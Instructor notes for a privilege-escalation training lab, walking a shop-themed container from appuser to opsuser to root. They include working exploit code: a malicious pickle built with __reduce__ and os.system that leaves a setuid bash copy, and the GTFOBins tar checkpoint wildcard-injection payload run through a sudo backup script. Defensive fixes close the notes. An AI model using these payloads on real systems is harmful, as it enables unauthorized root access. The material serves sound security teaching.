# Privilege escalation: instructor notes (Stage 10-14)

**Do not link this file from student-facing pages.** It is intended for
instructors verifying the lab and for a post-exercise debrief.

## Design: one strict path, three tiers, no shortcuts

Provisioned by `setup_privesc.sh` (run at container build time and by
`scripts/reset_lab.sh`). There is exactly one account at each tier and
exactly one way to move to the next one:

- **Low — `appuser`.** No group membership beyond its own, no interesting
  file access, and exactly **one** sudo grant:
  `appuser ALL=(opsuser) NOPASSWD: /opt/shop/scripts/ticket_export.py *`.
  Nothing else. `appuser` cannot edit `ticket_export.py` (root-owned, not
  writable).
- **Mid — `opsuser`.** Has **no valid password at all** -- the account is
  locked in `/etc/shadow`. There is nothing to brute-force, guess, or find
  leaked in a log anywhere: the *only* way to act as `opsuser` is the Hop 1
  exploit below. `opsuser` in turn has exactly **one** sudo grant:
  `opsuser ALL=(root) NOPASSWD: /opt/shop/scripts/backup.sh`. `opsuser`
  cannot edit `backup.sh` either (root-owned, not writable).
- **High — root.** Reached only via the Hop 2 exploit below.

### Hop 1 — appuser -> opsuser: insecure deserialization (CWE-502)

`ticket_export.py` (see its own docstring) is a plausible internal tool --
"re-hydrate a cached ticket-export object instead of re-querying
everything" -- that calls `pickle.load()` on whatever file path it's
given, with no validation. `pickle.load` executes arbitrary code embedded
in the file via any object's `__reduce__` method. Since `appuser` can
invoke this script *as opsuser* via the scoped sudo rule, and can point it
at any file `appuser` itself just wrote (`/tmp` is world-writable and
default-created files there are world-readable), `appuser` can craft a
malicious pickle and get code execution as `opsuser`.

### Hop 2 — opsuser -> root: tar wildcard/argument injection (GTFOBins)

`backup.sh` is root-owned, mode `755` -- **not** writable by `opsuser` or
anyone but root. It `cd`s into `/opt/shop/backups/staging/` (owned
`opsuser:opsuser`, mode `700`) and runs `tar -czf <dest> *`. Because the
*shell*, not `tar`, expands that glob, `opsuser` can plant filenames in
the staging directory that `tar`'s own argument parser will interpret as
flags rather than file names -- the classic GTFOBins `tar`
wildcard-injection technique.

## Expected student path

**Hop 1**, from an `appuser` shell (after Stage 9):
1. `id` -- an ordinary, unprivileged account; no interesting group.
2. `sudo -l` -- shows exactly one rule: `(opsuser) NOPASSWD:
   /opt/shop/scripts/ticket_export.py *`. This is the only lead.
3. `cat /opt/shop/scripts/ticket_export.py` (world-readable) -- see it
   calls `pickle.load()` on an attacker-controlled path. Recognize CWE-502.
4. Craft a malicious pickle, e.g.:
   ```python
   import pickle, os

   class Exploit:
       def __reduce__(self):
           return (os.system, ("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash",))

   with open("/tmp/payload.pkl", "wb") as f:
       pickle.dump(Exploit(), f)
   ```
5. `sudo -u opsuser /opt/shop/scripts/ticket_export.py /tmp/payload.pkl`
6. `/tmp/opsbash -p` -- now running as `opsuser`.
7. `cat /opt/shop/flags/stage2` -- proves the Hop 1 -> Hop 2 transition.

**Hop 2**, from the new `opsuser` shell:
8. `sudo -l` -- shows exactly one rule: `(root) NOPASSWD:
   /opt/shop/scripts/backup.sh`.
9. `ls -la /opt/shop/scripts/backup.sh` -- `root:root`, mode `755`, not
   writable. Editing it directly is not an option.
10. `cat /opt/shop/scripts/backup.sh` (world-readable) -- see it tars
    `/opt/shop/backups/staging/` with a bare `*` glob, and that directory
    is `opsuser`-owned.
11. Plant the classic GTFOBins tar checkpoint payload:
    ```bash
    cd /opt/shop/backups/staging
    echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh
    touch -- '--checkpoint=1'
    touch -- '--checkpoint-action=exec=sh payload.sh'
    sudo /opt/shop/scripts/backup.sh
    /tmp/rootbash -p
    ```
12. Read `/root/final_flag`.

## Why this is a good training vulnerability

- Deterministic and 100% reproducible after `reset_lab.sh` -- no reliance
  on a kernel version, timing, or an unpatched CVE.
- Two genuinely different bug classes stacked, each requiring different
  skills: exploit development against a Python deserialization sink for
  Hop 1 (real coding knowledge -- understanding `__reduce__` and why
  `pickle` is unsafe for untrusted input), and a well-known real-world
  pentesting technique (GTFOBins-style argument injection) for Hop 2.
- Not `ALL=(ALL) NOPASSWD:ALL` anywhere -- both sudo rules are narrowly
  scoped to exactly one script each, which is exactly why the deeper bug
  in each script needs to be found: a scoped sudo rule is NOT
  automatically safe just because the invoking account can't edit the
  target.
- **Exactly one path exists at every tier.** Each account has exactly one
  sudo grant, each targeted script has exactly one exploitable bug, and
  neither script nor any staging/working directory is reachable or
  writable by an account that hasn't already completed the prior hop.
  There is no group membership, no leaked credential, and no alternate
  technique that shortcuts either hop -- `tests/test_privilege_escalation.py`
  asserts the single-sudo-rule and non-writable-script properties for both
  hops, and `opsuser` having no valid password at all rules out any
  password-based route into that account.

## Defensive fix

- Never call `pickle.load()` (or any function using the `pickle` protocol
  under the hood, including some ORMs/caches) on data whose origin isn't
  fully trusted. Use a safe serialization format (JSON, protobuf) for
  anything crossing a trust boundary, even an internal one.
- Any script invoked via `sudo` that operates on a directory writable by
  the account permitted to invoke it must never pass an unquoted/glob
  argument straight to a program like `tar`, `chown`, `rsync`, or `chmod`
  that treats certain argument patterns specially -- use `--` to end
  option parsing, enumerate files explicitly, or run such tools with
  their unsafe-feature flags disabled where available (e.g. tar's
  `--no-auto-compress`/restricted checkpoint options).
- Prefer dedicated service accounts with no interactive login and no sudo
  rights of their own, triggered by a systemd timer instead of a
  human/application-invoked sudo rule, for anything resembling either of
  these two scripts in a real deployment.
